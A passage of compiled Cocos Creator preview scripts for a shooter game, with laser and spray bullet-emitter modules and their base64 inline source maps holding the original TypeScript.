QyxnQkFBZ0IsQ0FBQyxLQUFLLENBQUMsQ0FBQztZQUMxQyxZQUFZLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxxQkFBcUIsQ0FBQyxXQUFXLENBQUMsQ0FBQztRQUNuRSxDQUFDLENBQUMsQ0FBQyxDQUFDLENBQUM7SUFDYixDQUFDO0lBR0QsK0JBQUcsR0FBSCxVQUFJLEdBQVksRUFBRSxRQUFnQixFQUFFLEtBQWE7UUFDN0MsaUJBQU0sR0FBRyxZQUFDLEdBQUcsRUFBRSxRQUFRLEVBQUUsS0FBSyxDQUFDLENBQUM7UUFDaEMsSUFBSSxDQUFDLElBQUksQ0FBQyxLQUFLLEdBQUcsR0FBRyxDQUFDO1FBQ3RCLElBQUksQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxPQUFPLENBQUMsUUFBUSxHQUFDLEtBQUssRUFBRSxRQUFRLEdBQUMsR0FBRyxDQUFDLENBQUMsQ0FBQztJQUNsRSxDQUFDO0lBcENnQixpQkFBaUI7UUFEckMsT0FBTztPQUNhLGlCQUFpQixDQXFDckM7SUFBRCx3QkFBQztDQXJDRCxBQXFDQyxDQXJDOEMsZ0JBQU0sR0FxQ3BEO2tCQXJDb0IsaUJBQWlCIiwiZmlsZSI6IiIsInNvdXJjZVJvb3QiOiIvIiwic291cmNlc0NvbnRlbnQiOlsiXHJcbmltcG9ydCBCdWxsZXQgZnJvbSBcIi4vQnVsbGV0XCI7XHJcbmltcG9ydCBCdWxsZXRTdHJpa2VMaWdodG5pbmcgZnJvbSBcIi4uL2J1bGxldFN0cmlrZS9CdWxsZXRTdHJpa2VMaWdodG5pbmdcIjtcclxuXHJcbmNvbnN0IHtjY2NsYXNzLCBwcm9wZXJ0eX0gPSBjYy5fZGVjb3JhdG9yO1xyXG5cclxuQGNjY2xhc3NcclxuZXhwb3J0IGRlZmF1bHQgY2xhc3MgQnVsbGV0U2hhbkRpYW5RaXUgZXh0ZW5kcyBCdWxsZXQge1xyXG5cclxuICAgIHN0cmlrZShvdGhlciwgc2VsZik6IHZvaWQge1xyXG4gICAgICAgIGxldCBnYW1lQnVsbGV0c0NvbnRyb2xsZXIgPSB3aW5kb3dbJ0dhbWVCdWxsZXRzQ29udHJvbGxlciddO1xyXG4gICAgICAgIGxldCBidWxsZXRTdHJpa2UgPSBnYW1lQnVsbGV0c0NvbnRyb2xsZXIuZ2V0SW5hY3RpdmVCdWxsZXRTdHJpa2UodGhpcy5idWxsZXRJZCk7XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICBidWxsZXRTdHJpa2Uubm9kZS5wb3NpdGlvbiA9IGNjLnYyKCk7XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUucm90YXRpb24gPSB0aGlzLm5vZGUucm90YXRpb247XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUuc2V0Q29udGVudFNpemUob3RoZXIubm9kZS5nZXRDb250ZW50U2l6ZSgpKTtcclxuICAgICAgICBidWxsZXRTdHJpa2Uubm9kZS5yZW1vdmVGcm9tUGFyZW50KGZhbHNlKTtcclxuICAgICAgICBidWxsZXRTdHJpa2Uubm9kZS5zZXRQYXJlbnQob3RoZXIubm9kZSk7XHJcblxyXG4gICAgICAgIGxldCBzcHJpdGVOb2RlID0gKDxCdWxsZXRTdHJpa2VMaWdodG5pbmc+YnVsbGV0U3RyaWtlKS5zcHJpdGVOb2RlO1xyXG4gICAgICAgIGJ1bGxldFN0cmlrZS5ub2RlLnJvdGF0aW9uID0gTWF0aC5yYW5kb20oKSozNjA7XHJcbiAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUucnVuQWN0aW9uKGNjLnNlcXVlbmNlKFxyXG4gICAgICAgICAgICBjYy5yZXBlYXQoXHJcbiAgICAgICAgICAgICAgICBjYy5zZXF1ZW5jZShcclxuICAgICAgICAgICAgICAgICAgICBjYy5kZWxheVRpbWUoMC4wNSksXHJcbiAgICAgICAgICAgICAgICAgICAgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgICAgICAgICAgc3ByaXRlTm9kZS5hY3RpdmUgPSAhc3ByaXRlTm9kZS5hY3RpdmU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGJ1bGxldFN0cmlrZS5ub2RlLnJvdGF0aW9uID0gTWF0aC5yYW5kb20oKSozNjA7XHJcbiAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgICksIDYpLFxyXG4gICAgICAgICAgICBjYy5jYWxsRnVuYygoKT0+e1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUuc3RvcEFsbEFjdGlvbnMoKTtcclxuICAgICAgICAgICAgICAgIGJ1bGxldFN0cmlrZS5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0U3RyaWtlLm5vZGUucmVtb3ZlRnJvbVBhcmVudChmYWxzZSk7XHJcbiAgICAgICAgICAgICAgICBidWxsZXRTdHJpa2Uubm9kZS5zZXRQYXJlbnQoZ2FtZUJ1bGxldHNDb250cm9sbGVyLmJ1bGxldExheWVyKTtcclxuICAgICAgICAgICAgfSkpKTtcclxuICAgIH1cclxuXHJcblxyXG4gICAgZmx5KGRpcjogY2MuVmVjMiwgZGlzdGFuY2U6IG51bWJlciwgc3BlZWQ6IG51bWJlcik6IHZvaWQge1xyXG4gICAgICAgIHN1cGVyLmZseShkaXIsIGRpc3RhbmNlLCBzcGVlZCk7XHJcbiAgICAgICAgdGhpcy5ub2RlLnNjYWxlID0gMC4zO1xyXG4gICAgICAgIHRoaXMubm9kZS5ydW5BY3Rpb24oY2Muc2NhbGVUbyhkaXN0YW5jZS9zcGVlZCwgZGlzdGFuY2UvMzAwKSk7XHJcbiAgICB9XHJcbn1cclxuIl19
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletEmitter/BulletEmitterJiGuang.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'c2450ByS4xJTppJiZNkPck4', 'BulletEmitterJiGuang');
// script/app/entities/bulletEmitter/BulletEmitterJiGuang.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletEmitter_1 = require("./BulletEmitter");
var BulletEmitterJiGuang = /** @class */ (function (_super) {
    __extends(BulletEmitterJiGuang, _super);
    function BulletEmitterJiGuang(gameBulletsController) {
        var _this = _super.call(this, gameBulletsController) || this;
        _this._bulletJiGuang = null;
        _this._bulletJiGuangSke = null;
        _this._role = null;
        _this._firingRange = 800;
        _this._interval = 0.05;
        _this._speed = 1500;
        return _this;
    }
    BulletEmitterJiGuang.prototype.onEnter = function () {
        var _this = this;
        var bullet = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.JiGuang);
        bullet.collider.enabled = false;
        var ske = bullet.getComponent(sp.Skeleton);
        ske.setStartListener(function (trackEntry, loopCount) {
            var name = trackEntry.animation ? trackEntry.animation.name : '';
            if (name === "jiguang") {
                bullet.collider.enabled = true;
            }
        });
        ske.setCompleteListener(function (trackEntry, loopCount) {
            var name = trackEntry.animation ? trackEntry.animation.name : '';
            if (name === "xuneng") {
                ske.setAnimation(0, "jiguang", false);
            }
            else if (name === "jiguang") {
                _this.bulletCount--;
                bullet.collider.enabled = false;
                bullet.node.runAction(cc.sequence(cc.delayTime(0), cc.callFunc(function () {
                    if (!bullet.collider.enabled) {
                        bullet.node.active = false;
                    }
                })));
            }
        });
        this._bulletJiGuangSke = ske;
        this._bulletJiGuang = bullet;
        this._role = window['GameRoleController'].role;
        this.changeBulletPosition();
        this._role.node.on(cc.Node.EventType.POSITION_CHANGED, this.changeBulletPosition, this);
        this._role.node.on(cc.Node.EventType.ROTATION_CHANGED, this.changeBulletPosition, this);
    };
    BulletEmitterJiGuang.prototype.onExit = function () {
        this._bulletJiGuang.node.active = false;
        this._role.node.off(cc.Node.EventType.POSITION_CHANGED, this.changeBulletPosition, this);
        this._role.node.off(cc.Node.EventType.ROTATION_CHANGED, this.changeBulletPosition, this);
    };
    BulletEmitterJiGuang.prototype.changeBulletPosition = function () {
        this._bulletJiGuang.node.rotation = this._role.node.rotation;
        this._bulletJiGuang.node.position = this._role.node.position.add(cc.v2(0, 1).rotate(cc.misc.degreesToRadians(-this._role.node.rotation)).normalize().mul(this._role.gunTopNode.y + 20));
    };
    BulletEmitterJiGuang.prototype.fire = function (start, dir) {
        if (!this._bulletJiGuang.node.active) {
            this._bulletJiGuang.node.active = true;
            this._bulletJiGuangSke.setAnimation(0, "xuneng", false);
        }
        else if (this._bulletJiGuangSke.animation === "jiguang" && !this._bulletJiGuang.collider.enabled) {
            this._bulletJiGuangSke.setAnimation(0, "jiguang", false);
        }
    };
    return BulletEmitterJiGuang;
}(BulletEmitter_1.default));
exports.default = BulletEmitterJiGuang;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlckppR3VhbmcudHMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7OztBQUVBLGlEQUE0QztBQUs1QztJQUFrRCx3Q0FBYTtJQUUzRCw4QkFBWSxxQkFBMkM7UUFBdkQsWUFDSSxrQkFBTSxxQkFBcUIsQ0FBQyxTQUkvQjtRQUVPLG9CQUFjLEdBQVUsSUFBSSxDQUFDO1FBQzdCLHVCQUFpQixHQUFlLElBQUksQ0FBQztRQUVyQyxXQUFLLEdBQVEsSUFBSSxDQUFDO1FBUnRCLEtBQUksQ0FBQyxZQUFZLEdBQUcsR0FBRyxDQUFDO1FBQ3hCLEtBQUksQ0FBQyxTQUFTLEdBQUcsSUFBSSxDQUFDO1FBQ3RCLEtBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDOztJQUN2QixDQUFDO0lBT0Qsc0NBQU8sR0FBUDtRQUFBLGlCQStCQztRQTlCRyxJQUFJLE1BQU0sR0FBRyxJQUFJLENBQUMscUJBQXFCLENBQUMsaUJBQWlCLENBQUMsdUJBQWEsQ0FBQyxLQUFLLENBQUMsT0FBTyxDQUFDLENBQUM7UUFDdkYsTUFBTSxDQUFDLFFBQVEsQ0FBQyxPQUFPLEdBQUcsS0FBSyxDQUFDO1FBQ2hDLElBQUksR0FBRyxHQUFHLE1BQU0sQ0FBQyxZQUFZLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQyxDQUFDO1FBQzNDLEdBQUcsQ0FBQyxnQkFBZ0IsQ0FBQyxVQUFDLFVBQVUsRUFBRSxTQUFTO1lBQ3ZDLElBQUksSUFBSSxHQUFHLFVBQVUsQ0FBQyxTQUFTLENBQUMsQ0FBQyxDQUFDLFVBQVUsQ0FBQyxTQUFTLENBQUMsSUFBSSxDQUFDLENBQUMsQ0FBQyxFQUFFLENBQUM7WUFDakUsSUFBRyxJQUFJLEtBQUssU0FBUyxFQUFDO2dCQUNsQixNQUFNLENBQUMsUUFBUSxDQUFDLE9BQU8sR0FBRyxJQUFJLENBQUM7YUFDbEM7UUFDTCxDQUFDLENBQUMsQ0FBQztR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QUMsQ0FBQyxDQUFDO0lBQzVMLENBQUM7SUFFRCxtQ0FBSSxHQUFKLFVBQUssS0FBYyxFQUFFLEdBQVk7UUFDN0IsSUFBSSxDQUFDLElBQUksQ0FBQyxjQUFjLENBQUMsSUFBSSxDQUFDLE1BQU0sRUFBQztZQUNqQyxJQUFJLENBQUMsY0FBYyxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDO1lBQ3ZDLElBQUksQ0FBQyxpQkFBaUIsQ0FBQyxZQUFZLENBQUMsQ0FBQyxFQUFFLFFBQVEsRUFBRSxLQUFLLENBQUMsQ0FBQztTQUMzRDthQUFLLElBQUksSUFBSSxDQUFDLGlCQUFpQixDQUFDLFNBQVMsS0FBSyxTQUFTLElBQUksQ0FBQyxJQUFJLENBQUMsY0FBYyxDQUFDLFFBQVEsQ0FBQyxPQUFPLEVBQUM7WUFDOUYsSUFBSSxDQUFDLGlCQUFpQixDQUFDLFlBQVksQ0FBQyxDQUFDLEVBQUUsU0FBUyxFQUFFLEtBQUssQ0FBQyxDQUFDO1NBQzVEO0lBQ0wsQ0FBQztJQUNMLDJCQUFDO0FBQUQsQ0FqRUEsQUFpRUMsQ0FqRWlELHVCQUFhLEdBaUU5RCIsImZpbGUiOiIiLCJzb3VyY2VSb290IjoiLyIsInNvdXJjZXNDb250ZW50IjpbIlxyXG5pbXBvcnQgR2FtZUJ1bGxldHNDb250cm9sbGVyIGZyb20gXCIuLi8uLi9nYW1lL0dhbWVCdWxsZXRzQ29udHJvbGxlclwiO1xyXG5pbXBvcnQgQnVsbGV0RW1pdHRlciBmcm9tIFwiLi9CdWxsZXRFbWl0dGVyXCI7XHJcbmltcG9ydCBCdWxsZXQgZnJvbSBcIi4uL2J1bGxldC9CdWxsZXRcIjtcclxuaW1wb3J0IFJvbGUgZnJvbSBcIi4uL3JvbGUvUm9sZVwiO1xyXG5cclxuXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEJ1bGxldEVtaXR0ZXJKaUd1YW5nIGV4dGVuZHMgQnVsbGV0RW1pdHRlciB7XHJcblxyXG4gICAgY29uc3RydWN0b3IoZ2FtZUJ1bGxldHNDb250cm9sbGVyOkdhbWVCdWxsZXRzQ29udHJvbGxlcil7XHJcbiAgICAgICAgc3VwZXIoZ2FtZUJ1bGxldHNDb250cm9sbGVyKTtcclxuICAgICAgICB0aGlzLl9maXJpbmdSYW5nZSA9IDgwMDtcclxuICAgICAgICB0aGlzLl9pbnRlcnZhbCA9IDAuMDU7XHJcbiAgICAgICAgdGhpcy5fc3BlZWQgPSAxNTAwO1xyXG4gICAgfVxyXG5cclxuICAgIHByaXZhdGUgX2J1bGxldEppR3Vhbmc6QnVsbGV0ID0gbnVsbDtcclxuICAgIHByaXZhdGUgX2J1bGxldEppR3VhbmdTa2U6c3AuU2tlbGV0b24gPSBudWxsO1xyXG5cclxuICAgIHByaXZhdGUgX3JvbGU6Um9sZSA9IG51bGw7XHJcblxyXG4gICAgb25FbnRlcigpe1xyXG4gICAgICAgIGxldCBidWxsZXQgPSB0aGlzLmdhbWVCdWxsZXRzQ29udHJvbGxlci5nZXRJbmFjdGl2ZUJ1bGxldChCdWxsZXRFbWl0dGVyLlRZUEVTLkppR3VhbmcpO1xyXG4gICAgICAgIGJ1bGxldC5jb2xsaWRlci5lbmFibGVkID0gZmFsc2U7XHJcbiAgICAgICAgbGV0IHNrZSA9IGJ1bGxldC5nZXRDb21wb25lbnQoc3AuU2tlbGV0b24pO1xyXG4gICAgICAgIHNrZS5zZXRTdGFydExpc3RlbmVyKCh0cmFja0VudHJ5LCBsb29wQ291bnQpPT57XHJcbiAgICAgICAgICAgIGxldCBuYW1lID0gdHJhY2tFbnRyeS5hbmltYXRpb24gPyB0cmFja0VudHJ5LmFuaW1hdGlvbi5uYW1lIDogJyc7XHJcbiAgICAgICAgICAgIGlmKG5hbWUgPT09IFwiamlndWFuZ1wiKXtcclxuICAgICAgICAgICAgICAgIGJ1bGxldC5jb2xsaWRlci5lbmFibGVkID0gdHJ1ZTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH0pO1xyXG4gICAgICAgIHNrZS5zZXRDb21wbGV0ZUxpc3RlbmVyKCh0cmFja0VudHJ5LCBsb29wQ291bnQpID0+IHtcclxuICAgICAgICAgICAgbGV0IG5hbWUgPSB0cmFja0VudHJ5LmFuaW1hdGlvbiA/IHRyYWNrRW50cnkuYW5pbWF0aW9uLm5hbWUgOiAnJztcclxuICAgICAgICAgICAgaWYgKG5hbWUgPT09IFwieHVuZW5nXCIpIHtcclxuICAgICAgICAgICAgICAgIHNrZS5zZXRBbmltYXRpb24oMCwgXCJqaWd1YW5nXCIsIGZhbHNlKTtcclxuICAgICAgICAgICAgfWVsc2UgaWYobmFtZSA9PT0gXCJqaWd1YW5nXCIpe1xyXG4gICAgICAgICAgICAgICAgdGhpcy5idWxsZXRDb3VudC0tO1xyXG4gICAgICAgICAgICAgICAgYnVsbGV0LmNvbGxpZGVyLmVuYWJsZWQgPSBmYWxzZTtcclxuICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5kZWxheVRpbWUoMCksIGNjLmNhbGxGdW5jKCgpPT57XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKCFidWxsZXQuY29sbGlkZXIuZW5hYmxlZCl7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGJ1bGxldC5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0pKSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9KTtcclxuICAgICAgICB0aGlzLl9idWxsZXRKaUd1YW5nU2tlID0gc2tlO1xyXG4gICAgICAgIHRoaXMuX2J1bGxldEppR3VhbmcgPSBidWxsZXQ7XHJcblxyXG4gICAgICAgIHRoaXMuX3JvbGUgPSB3aW5kb3dbJ0dhbWVSb2xlQ29udHJvbGxlciddLnJvbGU7XHJcbiAgICAgICAgdGhpcy5jaGFuZ2VCdWxsZXRQb3NpdGlvbigpO1xyXG4gICAgICAgIHRoaXMuX3JvbGUubm9kZS5vbihjYy5Ob2RlLkV2ZW50VHlwZS5QT1NJVElPTl9DSEFOR0VELCB0aGlzLmNoYW5nZUJ1bGxldFBvc2l0aW9uLCB0aGlzKTtcclxuICAgICAgICB0aGlzLl9yb2xlLm5vZGUub24oY2MuTm9kZS5FdmVudFR5cGUuUk9UQVRJT05fQ0hBTkdFRCwgdGhpcy5jaGFuZ2VCdWxsZXRQb3NpdGlvbiwgdGhpcyk7XHJcbiAgICB9XHJcbiAgICBvbkV4aXQoKXtcclxuICAgICAgICB0aGlzLl9idWxsZXRKaUd1YW5nLm5vZGUuYWN0aXZlID0gZmFsc2U7XHJcbiAgICAgICAgdGhpcy5fcm9sZS5ub2RlLm9mZihjYy5Ob2RlLkV2ZW50VHlwZS5QT1NJVElPTl9DSEFOR0VELCB0aGlzLmNoYW5nZUJ1bGxldFBvc2l0aW9uLCB0aGlzKTtcclxuICAgICAgICB0aGlzLl9yb2xlLm5vZGUub2ZmKGNjLk5vZGUuRXZlbnRUeXBlLlJPVEFUSU9OX0NIQU5HRUQsIHRoaXMuY2hhbmdlQnVsbGV0UG9zaXRpb24sIHRoaXMpO1xyXG4gICAgfVxyXG5cclxuICAgIGNoYW5nZUJ1bGxldFBvc2l0aW9uKCl7XHJcbiAgICAgICAgdGhpcy5fYnVsbGV0SmlHdWFuZy5ub2RlLnJvdGF0aW9uID0gdGhpcy5fcm9sZS5ub2RlLnJvdGF0aW9uO1xyXG4gICAgICAgIHRoaXMuX2J1bGxldEppR3Vhbmcubm9kZS5wb3NpdGlvbiA9IHRoaXMuX3JvbGUubm9kZS5wb3NpdGlvbi5hZGQoY2MudjIoMCwgMSkucm90YXRlKGNjLm1pc2MuZGVncmVlc1RvUmFkaWFucygtdGhpcy5fcm9sZS5ub2RlLnJvdGF0aW9uKSkubm9ybWFsaXplKCkubXVsKHRoaXMuX3JvbGUuZ3VuVG9wTm9kZS55ICsgMjApKTtcclxuICAgIH1cclxuXHJcbiAgICBmaXJlKHN0YXJ0OiBjYy5WZWMyLCBkaXI6IGNjLlZlYzIpIHtcclxuICAgICAgICBpZiAoIXRoaXMuX2J1bGxldEppR3Vhbmcubm9kZS5hY3RpdmUpe1xyXG4gICAgICAgICAgICB0aGlzLl9idWxsZXRKaUd1YW5nLm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuICAgICAgICAgICAgdGhpcy5fYnVsbGV0SmlHdWFuZ1NrZS5zZXRBbmltYXRpb24oMCwgXCJ4dW5lbmdcIiwgZmFsc2UpO1xyXG4gICAgICAgIH1lbHNlIGlmICh0aGlzLl9idWxsZXRKaUd1YW5nU2tlLmFuaW1hdGlvbiA9PT0gXCJqaWd1YW5nXCIgJiYgIXRoaXMuX2J1bGxldEppR3VhbmcuY29sbGlkZXIuZW5hYmxlZCl7XHJcbiAgICAgICAgICAgIHRoaXMuX2J1bGxldEppR3VhbmdTa2Uuc2V0QW5pbWF0aW9uKDAsIFwiamlndWFuZ1wiLCBmYWxzZSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG59XHJcbiJdfQ==
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/entities/bulletEmitter/BulletEmitterPenZi.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, 'ff0edq6VF9JqK8aSEOQPcB3', 'BulletEmitterPenZi');
// script/app/entities/bulletEmitter/BulletEmitterPenZi.ts

Object.defineProperty(exports, "__esModule", { value: true });
var BulletEmitter_1 = require("./BulletEmitter");
var World_1 = require("../../info/World");
var magnify = 1;
var BulletEmitterPenZi = /** @class */ (function (_super) {
    __extends(BulletEmitterPenZi, _super);
    function BulletEmitterPenZi(gameBulletsController) {
        var _this = _super.call(this, gameBulletsController) || this;
        _this._firingRange = 800;
        _this._interval = 0.05;
        _this._speed = 1500;
        return _this;
    }
    BulletEmitterPenZi.prototype.fire = function (start, dir) {
        this.bulletCount--;
        var bullet = this.gameBulletsController.getInactiveBullet(BulletEmitter_1.default.TYPES.PenZi);
        var ske = bullet.getComponent(sp.Skeleton);
        ske.setCompleteListener(function (trackEntry, loopCount) {
            var name = trackEntry.animation ? trackEntry.animation.name : '';
            bullet.node.active = false;
        });
        bullet.node.active = true;
        bullet.node.position = start;
        bullet.node.scale = magnify * World_1.World.My.armory.magnifyMul(bullet.bulletId);
        bullet.node.rotation = 90 - cc.misc.radiansToDegrees(Math.atan2(dir.y, dir.x));
        ske.setAnimation(0, "animation", false);
    };
    return BulletEmitterPenZi;
}(BulletEmitter_1.default));
exports.default = BulletEmitterPenZi;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2VudGl0aWVzL2J1bGxldEVtaXR0ZXIvQnVsbGV0RW1pdHRlclBlblppLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7Ozs7QUFDQSxpREFBNEM7QUFFNUMsMENBQXVDO0FBRXZDLElBQU0sT0FBTyxHQUFHLENBQUMsQ0FBQztBQUVsQjtJQUFnRCxzQ0FBYTtJQUV6RCw0QkFBWSxxQkFBMkM7UUFBdkQsWUFDSSxrQkFBTSxxQkFBcUIsQ0FBQyxTQUkvQjtRQUhHLEtBQUksQ0FBQyxZQUFZLEdBQUcsR0FBRyxDQUFDO1FBQ3hCLEtBQUksQ0FBQyxTQUFTLEdBQUcsSUFBSSxDQUFDO1FBQ3RCLEtBQUksQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDOztJQUN2QixDQUFDO0lBRUQsaUNBQUksR0FBSixVQUFLLEtBQWMsRUFBRSxHQUFZO1FBQzdCLElBQUksQ0FBQyxXQUFXLEVBQUUsQ0FBQztRQUNuQixJQUFJLE1BQU0sR0FBRyxJQUFJLENBQUMscUJBQXFCLENBQUMsaUJBQWlCLENBQUMsdUJBQWEsQ0FBQyxLQUFLLENBQUMsS0FBSyxDQUFDLENBQUM7UUFDckYsSUFBSSxHQUFHLEdBQUcsTUFBTSxDQUFDLFlBQVksQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDLENBQUM7UUFDM0MsR0FBRyxDQUFDLG1CQUFtQixDQUFDLFVBQUMsVUFBVSxFQUFFLFNBQVM7